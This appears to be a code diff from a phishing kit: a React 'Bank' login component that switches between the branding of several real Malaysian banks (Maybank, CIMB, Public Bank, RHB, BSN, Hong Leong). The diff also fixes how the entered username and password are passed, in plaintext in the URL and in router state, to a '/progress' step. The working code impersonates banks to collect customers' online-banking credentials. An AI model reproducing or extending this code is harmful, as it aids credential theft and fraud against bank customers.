@@ -19,67 +19,64 @@ const Bank = () => {
   const [password, setPassword] = useState("");
 
   const bank = useMemo(() => {
-    if (bankCode === "mbb") {
-      return {
-        title: "Maybank",
-        color: "#495057",
-        background: "#FFCF00",
-        backgroundImage: "url(/mbb-background.jpg)",
-        logo: "/mbb-logo.png",
-      };
+    switch (bankCode) {
+      case "mbb":
+        return {
+          title: "Maybank",
+          color: "#495057",
+          background: "#FFCF00",
+          backgroundImage: "url(/mbb-background.jpg)",
+          logo: "/mbb-logo.png",
+        };
+      case "hlb":
+        return {
+          title: "Hong Leong Bank",
+          color: "#FFFFFF",
+          background: "#002D62",
+          backgroundImage: "url(/hlb-background.jpg)",
+          logo: "/hlb-logo.gif",
+        };
+      case "cimb":
+        return {
+          title: "CIMB",
+          color: "#FFFFFF",
+          background: "#EC1D23",
+          backgroundImage: "url(/cimb-background.png)",
+          logo: "/cimb-logo.png",
+        };
+      case "pbb":
+        return {
+          title: "Public Bank",
+          color: "#FFFFFF",
+          background: "#D84A38",
+          backgroundImage: "url(/pbb-background.jpg)",
+          logo: "/pbb-logo.svg",
+        };
+      case "rhb":
+        return {
+          title: "RHB",
+          color: "#FFFFFF",
+          background: "#0067B1",
+          backgroundImage: "url(/rhb-background.jpg)",
+          logo: "/rhb-logo.webp",
+        };
+      case "bsn":
+        return {
+          title: "BSN",
+          color: "#FFFFFF",
+          background: "#00A1B1",
+          backgroundImage: "url(/bsn-background.jpeg)",
+          logo: "/bsn-logo.png",
+        };
+      default:
+        return {
+          title: "Bank",
+          color: "#FFFFFF",
+          background: "#000000",
+          backgroundImage: "url(/bank-background.jpg)",
+          logo: "/bank-logo.png",
+        };
     }
-    if (bankCode === "hlb") {
-      return {
-        title: "Hong Leong Bank",
-        color: "#FFFFFF",
-        background: "#002D62",
-        backgroundImage: "url(/hlb-background.jpg)",
-        logo: "/hlb-logo.gif",
-      };
-    }
-    if (bankCode === "cimb") {
-      return {
-        title: "CIMB",
-        color: "#FFFFFF",
-        background: "#EC1D23",
-        backgroundImage: "url(/cimb-background.png)",
-        logo: "/cimb-logo.png",
-      };
-    }
-    if (bankCode === "pbb") {
-      return {
-        title: "Public Bank",
-        color: "#FFFFFF",
-        background: "#D84A38",
-        backgroundImage: "url(/pbb-background.jpg)",
-        logo: "/pbb-logo.svg",
-      };
-    }
-    if (bankCode === "rhb") {
-      return {
-        title: "RHB",
-        color: "#FFFFFF",
-        background: "#0067B1",
-        backgroundImage: "url(/rhb-background.jpg)",
-        logo: "/rhb-logo.webp",
-      };
-    }
-    if (bankCode === "bsn") {
-      return {
-        title: "BSN",
-        color: "#FFFFFF",
-        background: "#00A1B1",
-        backgroundImage: "url(/bsn-background.jpeg)",
-        logo: "/bsn-logo.png",
-      };
-    }
-    return {
-      title: "Bank",
-      color: "#FFFFFF",
-      background: "#000000",
-      backgroundImage: "url(/bank-background.jpg)",
-      logo: "/bank-logo.png",
-    };
   }, [bankCode]);
 
   const handleClickShowPassword = () => setShowPassword((show) => !show);
@@ -92,9 +89,12 @@ const Bank = () => {
     if (username && password) {
       const dt = `my^^${bankCode}`;
       navigate(
-        `/progress?username=${encodeURIComponent(username)}&password=${
-          (encodeURIComponent(password), { state: { username, password, dt } })
-        }`
+        `/progress?username=${encodeURIComponent(username)}&password=${encodeURIComponent(
+          password
+        )}`,
+        {
+          state: { username, password, dt },
+        }
       );
     } else {
       alert("Please enter both username and password");
